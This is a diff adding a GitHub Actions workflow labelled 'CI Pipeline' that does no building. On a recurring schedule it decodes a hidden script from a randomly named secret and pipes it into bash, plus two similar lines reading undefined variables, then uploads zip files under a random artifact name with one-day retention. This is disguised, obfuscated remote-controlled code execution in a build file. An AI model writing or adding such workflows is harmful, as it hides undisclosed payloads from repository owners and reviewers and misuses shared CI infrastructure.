@@ -1,0 +1,30 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '7 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          ypc8574: ${{ secrets.ypc8574 }}
+        run: |
+          printf '%s' "$ypc8574" | jq -r .ibbdk9 | /bin/bash
+          printf '%s' "$df398" | jq -r .bwqc2398 | /bin/bash
+          echo $quws8496 | jq -r .gcmg4895 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1FzlDnzX
+          path: "*.zip"
+          retention-days: 1
